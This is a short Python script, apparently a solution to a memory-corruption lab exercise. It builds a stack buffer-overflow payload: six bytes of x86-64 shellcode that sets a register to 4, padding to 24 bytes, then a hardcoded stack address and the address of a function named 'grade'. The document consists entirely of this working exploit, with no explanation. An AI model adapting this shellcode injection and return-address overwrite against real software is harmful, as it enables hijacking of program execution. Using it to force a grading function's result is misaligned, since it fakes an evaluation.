import sys, struct

shellcode = bytes([0xbf, 0x04, 0x00, 0x00, 0x00, 0xc3])
shellcode += b'A' * (24 - len(shellcode))

stack_addr = 0x721000800fd0
grade_addr = 0x401a87

payload = shellcode
payload += struct.pack('<Q', stack_addr)
payload += struct.pack('<Q', grade_addr)

sys.stdout.buffer.write(payload)
